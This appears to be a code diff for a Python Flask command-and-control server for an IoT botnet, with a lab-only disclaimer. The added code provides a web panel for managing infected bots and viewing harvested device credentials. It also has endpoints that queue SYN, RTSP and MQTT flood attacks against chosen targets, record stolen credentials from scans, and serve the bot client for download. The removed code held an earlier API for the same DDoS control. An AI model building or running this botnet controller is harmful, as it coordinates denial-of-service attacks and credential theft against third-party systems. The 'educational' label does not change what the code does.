@@ -4,12 +4,13 @@ IoT Security Research - Command & Control Server
 Educational Purpose Only - For Controlled Lab Environment
 """
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_file, render_template_string
 import sqlite3
 import threading
 import time
 from datetime import datetime
 import logging
+from werkzeug.serving import make_server
 
 app = Flask(__name__)
 
@@ -146,171 +147,354 @@ attack_status = {
 # Initialize database on startup
 init_database()
 
-@app.route('/register-device', methods=['POST'])
-def register_device():
-    """Register a compromised device with credentials"""
-    data = request.json
-    ip = data.get('ip')
-    username = data.get('username')
-    password = data.get('password')
-    
-    if not all([ip, username, password]):
-        return jsonify({"error": "Missing required fields"}), 400
-    
-    if db_manager.register_device(ip, username, password):
-        return jsonify({"status": "registered", "message": f"Device {ip} registered successfully"}), 200
-    else:
-        return jsonify({"error": "Registration failed"}), 500
+# HTML template for web interface
+HTML_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IoT C2 Server</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .section { margin-bottom: 20px; padding: 20px; border: 1px solid #ddd; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 8px; text-align: left; border: 1px solid #ddd; }
+        th { background-color: #f5f5f5; }
+        .button { padding: 5px 10px; margin: 2px; cursor: pointer; }
+        .success { color: green; }
+        .error { color: red; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>IoT C2 Server Control Panel</h1>
+        
+        <div class="section">
+            <h2>Active Bots</h2>
+            <table>
+                <tr>
+                    <th>IP Address</th>
+                    <th>Status</th>
+                    <th>Last Seen</th>
+                    <th>Actions</th>
+                </tr>
+                {% for bot in bots %}
+                <tr>
+                    <td>{{ bot.ip }}</td>
+                    <td>{{ bot.status }}</td>
+                    <td>{{ bot.last_seen }}</td>
+                    <td>
+                        <button onclick="startAttack('{{ bot.ip }}')">Start Attack</button>
+                        <button onclick="stopAttack('{{ bot.ip }}')">Stop Attack</button>
+                    </td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
 
-@app.route('/bot-checkin', methods=['POST'])
-def bot_checkin():
-    """Bot check-in to update status"""
-    data = request.json
-    ip = data.get('ip')
-    
-    if ip:
-        db_manager.update_device_status(ip, 'online')
-        return jsonify({"status": "checked_in"}), 200
-    return jsonify({"error": "No IP provided"}), 400
+        <div class="section">
+            <h2>Scan Results</h2>
+            <table>
+                <tr>
+                    <th>IP Address</th>
+                    <th>Port</th>
+                    <th>Service</th>
+                    <th>Credentials</th>
+                    <th>Timestamp</th>
+                </tr>
+                {% for result in scan_results %}
+                <tr>
+                    <td>{{ result.ip }}</td>
+                    <td>{{ result.port }}</td>
+                    <td>{{ result.service }}</td>
+                    <td>{{ result.credentials }}</td>
+                    <td>{{ result.timestamp }}</td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
 
-@app.route('/get-command/<bot_ip>', methods=['GET'])
-def get_command(bot_ip):
-    """Get command for specific bot"""
-    global current_attack, attack_status
-    
-    # Update bot status
-    db_manager.update_device_status(bot_ip, 'online')
-    
-    if attack_status['active']:
-        return jsonify({
-            "command": current_attack,
-            "target": attack_status['target'],
-            "attack_type": attack_status['type']
-        }), 200
-    else:
-        return jsonify({"command": "idle"}), 200
+        <div class="section">
+            <h2>Command History</h2>
+            <table>
+                <tr>
+                    <th>Bot IP</th>
+                    <th>Command</th>
+                    <th>Target</th>
+                    <th>Status</th>
+                    <th>Timestamp</th>
+                </tr>
+                {% for cmd in commands %}
+                <tr>
+                    <td>{{ cmd.bot_ip }}</td>
+                    <td>{{ cmd.command }}</td>
+                    <td>{{ cmd.target }}</td>
+                    <td>{{ cmd.status }}</td>
+                    <td>{{ cmd.timestamp }}</td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
+    </div>
 
-@app.route('/start-ddos', methods=['POST'])
-def start_ddos():
-    """Start DDoS attack"""
-    global current_attack, attack_status
-    
-    data = request.json
-    target = data.get('target', '10.10.10.100')  # Default broker IP
-    attack_type = data.get('type', 'syn_flood')
-    
-    online_bots = db_manager.get_online_devices()
-    
-    if not online_bots:
-        return jsonify({"error": "No online bots available"}), 400
-    
-    current_attack = "start_attack"
-    attack_status.update({
-        'active': True,
-        'type': attack_type,
-        'target': target,
-        'start_time': datetime.now(),
-        'participating_bots': len(online_bots)
-    })
-    
-    # Log attack in database
-    attack_id = db_manager.log_attack(attack_type, target, len(online_bots))
-    
-    logging.info(f"DDoS attack started against {target} with {len(online_bots)} bots")
-    
-    return jsonify({
-        "status": "attack_started",
-        "target": target,
-        "participating_bots": len(online_bots),
-        "attack_id": attack_id
-    }), 200
+    <script>
+        function startAttack(botIp) {
+            const target = prompt('Enter target IP:');
+            const attackType = prompt('Enter attack type (syn/rtsp/mqtt):');
+            if (target && attackType) {
+                fetch('/start-attack', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        bot_ip: botIp,
+                        target: target,
+                        attack_type: attackType
+                    })
+                }).then(response => response.json())
+                  .then(data => alert(data.message));
+            }
+        }
 
-@app.route('/stop-ddos', methods=['POST'])
-def stop_ddos():
-    """Stop DDoS attack"""
-    global current_attack, attack_status
-    
-    if not attack_status['active']:
-        return jsonify({"message": "No active attack to stop"}), 200
-    
-    current_attack = "stop_attack"
-    
-    # Wait a moment for bots to receive stop command
-    def reset_attack_status():
-        time.sleep(5)
-        global attack_status
-        attack_status.update({
-            'active': False,
-            'type': None,
-            'target': None,
-            'start_time': None,
-            'participating_bots': 0
-        })
-    
-    threading.Thread(target=reset_attack_status).start()
-    
-    logging.info("DDoS attack stopped")
-    
-    return jsonify({"status": "attack_stopped"}), 200
+        function stopAttack(botIp) {
+            fetch('/stop-attack', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({bot_ip: botIp})
+            }).then(response => response.json())
+              .then(data => alert(data.message));
+        }
 
-@app.route('/devices', methods=['GET'])
-def list_devices():
-    """List all registered devices"""
-    devices = db_manager.get_all_devices()
-    device_list = []
-    
-    for device in devices:
-        device_list.append({
-            'id': device[0],
-            'ip': device[1],
-            'username': device[2],
-            'status': device[4],
-            'last_seen': device[5],
-            'infection_time': device[6]
-        })
-    
-    return jsonify({
-        'total_devices': len(device_list),
-        'devices': device_list
-    }), 200
+        // Auto-refresh every 30 seconds
+        setInterval(() => location.reload(), 30000);
+    </script>
+</body>
+</html>
+'''
 
-@app.route('/status', methods=['GET'])
-def get_status():
-    """Get current C&C status"""
-    online_bots = db_manager.get_online_devices()
+class C2Server:
+    def __init__(self, host='0.0.0.0', port=5000):
+        self.host = host
+        self.port = port
+        self.bots = {}
+        self.commands = {}
+        self.scan_results = []
+        self.server = None
+        init_database()
+        
+    def log(self, message):
+        """Log message with timestamp"""
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        logging.info(f"[C2 Server] {message}")
     
-    return jsonify({
-        'server_status': 'online',
-        'total_bots': len(db_manager.get_all_devices()),
-        'online_bots': len(online_bots),
-        'current_attack': attack_status
-    }), 200
+    def start(self):
+        """Start the C2 server"""
+        self.log(f"Starting C2 server on {self.host}:{self.port}")
+        self.server = make_server(self.host, self.port, app)
+        self.server.serve_forever()
+    
+    def stop(self):
+        """Stop the C2 server"""
+        if self.server:
+            self.server.shutdown()
+            self.log("C2 server stopped")
 
-@app.route('/research-data', methods=['GET'])
-def get_research_data():
-    """Get data for research analysis"""
-    conn = db_manager.get_connection()
+# Flask routes
+@app.route('/')
+def index():
+    """Web interface for C2 server"""
+    conn = sqlite3.connect('research_db.sqlite')
     cursor = conn.cursor()
     
-    # Get attack statistics
-    cursor.execute('SELECT * FROM attack_logs ORDER BY start_time DESC LIMIT 10')
-    recent_attacks = cursor.fetchall()
+    # Get active bots
+    cursor.execute('SELECT ip, status, last_seen FROM devices WHERE status = "online" ORDER BY last_seen DESC')
+    bots = [{'ip': row[0], 'status': row[1], 'last_seen': row[2]} for row in cursor.fetchall()]
     
-    # Get device statistics
-    cursor.execute('SELECT status, COUNT(*) FROM devices GROUP BY status')
-    device_stats = cursor.fetchall()
+    # Get scan results
+    cursor.execute('SELECT ip, port, service, credentials, timestamp FROM attack_logs ORDER BY timestamp DESC')
+    scan_results = [{'ip': row[0], 'port': row[1], 'service': row[2], 
+                    'credentials': row[3], 'timestamp': row[4]} for row in cursor.fetchall()]
+    
+    # Get command history
+    cursor.execute('SELECT id, command, target_ip, attack_type, status, timestamp FROM commands ORDER BY timestamp DESC')
+    commands = [{'id': row[0], 'command': row[1], 'target': row[2], 
+                'attack_type': row[3], 'status': row[4], 'timestamp': row[5]} for row in cursor.fetchall()]
     
     conn.close()
     
-    return jsonify({
-        'recent_attacks': recent_attacks,
-        'device_statistics': dict(device_stats),
-        'timestamp': datetime.now().isoformat()
-    }), 200
+    return render_template_string(HTML_TEMPLATE, 
+                                bots=bots, 
+                                scan_results=scan_results, 
+                                commands=commands)
 
-if __name__ == '__main__':
-    print("="*50)
-    print("IoT Security Research - C&C Server")
-    print("Educational Purpose Only")
-    print("="*50)
-    app.run(host='0.0.0.0', port=5000, debug=False)
+@app.route('/bot-checkin', methods=['POST'])
+def bot_checkin():
+    """Handle bot check-in"""
+    try:
+        data = request.json
+        bot_ip = data.get('ip')
+        status = data.get('status', 'active')
+        last_command_id = data.get('last_command_id')
+        
+        if not bot_ip:
+            return jsonify({'error': 'Missing bot IP'}), 400
+        
+        # Update bot status in database
+        conn = sqlite3.connect('research_db.sqlite')
+        cursor = conn.cursor()
+        cursor.execute('''INSERT OR REPLACE INTO devices (ip, status, last_seen)
+                    VALUES (?, ?, datetime('now'))''', (bot_ip, status))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success'})
+        
+    except Exception as e:
+        logging.error(f"Error in bot check-in: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/get-command/<bot_ip>', methods=['GET'])
+def get_command(bot_ip):
+    """Get command for bot"""
+    try:
+        conn = sqlite3.connect('research_db.sqlite')
+        cursor = conn.cursor()
+        
+        # Get latest command for bot
+        cursor.execute('''SELECT id, command, target_ip, attack_type 
+                    FROM commands 
+                    WHERE target_ip = ? AND status = 'pending'
+                    ORDER BY timestamp DESC LIMIT 1''', (bot_ip,))
+        result = cursor.fetchone()
+        
+        if result:
+            command_id, command, target, attack_type = result
+            command_data = {
+                'command_id': command_id,
+                'command': command,
+                'target': target,
+                'attack_type': attack_type
+            }
+            
+            # Update command status
+            cursor.execute('''UPDATE commands 
+                        SET status = 'executing' 
+                        WHERE id = ?''', (command_id,))
+            conn.commit()
+            
+            return jsonify(command_data)
+        
+        conn.close()
+        return jsonify(None)
+        
+    except Exception as e:
+        logging.error(f"Error getting command: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/start-attack', methods=['POST'])
+def start_attack():
+    """Start DDoS attack"""
+    try:
+        data = request.json
+        bot_ip = data.get('bot_ip')
+        target = data.get('target')
+        attack_type = data.get('attack_type', 'syn')
+        
+        if not all([bot_ip, target]):
+            return jsonify({'error': 'Missing required parameters'}), 400
+        
+        # Add command to database
+        conn = sqlite3.connect('research_db.sqlite')
+        cursor = conn.cursor()
+        cursor.execute('''INSERT INTO commands 
+                    (command, target_ip, attack_type, status, timestamp)
+                    VALUES (?, ?, ?, 'pending', datetime('now'))''',
+                 (f"start_ddos {target} {attack_type}", bot_ip, attack_type))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'message': f'Attack command sent to {bot_ip}'})
+        
+    except Exception as e:
+        logging.error(f"Error starting attack: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/stop-attack', methods=['POST'])
+def stop_attack():
+    """Stop DDoS attack"""
+    try:
+        data = request.json
+        bot_ip = data.get('bot_ip')
+        
+        if not bot_ip:
+            return jsonify({'error': 'Missing bot IP'}), 400
+        
+        # Add stop command to database
+        conn = sqlite3.connect('research_db.sqlite')
+        cursor = conn.cursor()
+        cursor.execute('''INSERT INTO commands 
+                    (command, target_ip, status, timestamp)
+                    VALUES (?, ?, ?, datetime('now'))''',
+                 (f"stop_ddos {bot_ip}", bot_ip, 'pending'))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'message': f'Stop command sent to {bot_ip}'})
+        
+    except Exception as e:
+        logging.error(f"Error stopping attack: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/add-scan-result', methods=['POST'])
+def add_scan_result():
+    """Add scan result to database"""
+    try:
+        data = request.json
+        required_fields = ['ip', 'port', 'service']
+        
+        if not all(field in data for field in required_fields):
+            return jsonify({'error': 'Missing required fields'}), 400
+        
+        conn = sqlite3.connect('research_db.sqlite')
+        cursor = conn.cursor()
+        cursor.execute('''INSERT INTO attack_logs 
+                    (ip, port, service, credentials, timestamp)
+                    VALUES (?, ?, ?, ?, datetime('now'))''',
+                 (data['ip'], data['port'], data['service'], 
+                  data.get('credentials', '')))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success'})
+        
+    except Exception as e:
+        logging.error(f"Error adding scan result: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/download-bot', methods=['GET'])
+def download_bot():
+    """Serve bot client script"""
+    try:
+        return send_file('bot_client.py',
+                        mimetype='text/plain',
+                        as_attachment=True,
+                        download_name='bot_client.py')
+    except Exception as e:
+        logging.error(f"Error serving bot client: {e}")
+        return jsonify({'error': str(e)}), 500
+
+def main():
+    """Main entry point"""
+    import argparse
+    parser = argparse.ArgumentParser(description='IoT C2 Server')
+    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
+    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
+    args = parser.parse_args()
+    
+    server = C2Server(args.host, args.port)
+    try:
+        server.start()
+    except KeyboardInterrupt:
+        server.stop()
+
+if __name__ == "__main__":
+    main()
